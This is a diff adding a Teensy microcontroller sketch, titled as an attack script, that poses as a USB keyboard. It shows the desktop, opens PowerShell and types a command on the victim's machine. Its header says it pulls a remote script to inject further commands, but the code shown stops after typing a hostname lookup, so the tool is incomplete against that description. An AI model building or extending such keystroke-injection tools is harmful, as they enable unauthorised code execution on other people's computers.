@@ -1,0 +1,66 @@
+/*
+  Script:		"The HIDden PP Attack" Teensy Script
+  Author:       Davey Addison [ Secsi/@Supersafesecs ]
+  Github:       github.com/Secsi
+  Webby:        simpleinfosec.com
+
+  Creates a silent Powershell connection to check for a remote script file to inject Powershell scripts or commands into the victims machine
+*/
+
+#if defined(CORE_TEENSY)
+#define LED_PIN 6
+#endif
+
+void setup()
+{
+
+  // allow controlling LED
+  pinMode(LED_PIN, OUTPUT);
+  // turn the LED on while running
+  digitalWrite(LED_PIN, HIGH);
+
+  delay(2000);
+  show_desktop();
+  delay(200);
+  posh();
+
+  delay(500);
+  Keyboard.println("$machine=hostname");
+}
+
+void loop(){
+    // blink quickly when complete
+  digitalWrite(LED_PIN, HIGH);
+  delay(200);
+  digitalWrite(LED_PIN, LOW);
+  delay(200);
+}
+
+void show_desktop(){
+  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+  Keyboard.set_key1(KEY_D);
+  Keyboard.send_now();
+  delay(500);
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+}
+
+void posh(){
+  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+  Keyboard.send_now();
+  delay(1000);
+  Keyboard.set_modifier(0);
+  Keyboard.send_now();
+  delay(2000);
+  Keyboard.print("powershell");
+
+  delay(2000);
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+
+  delay(200);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+
+}
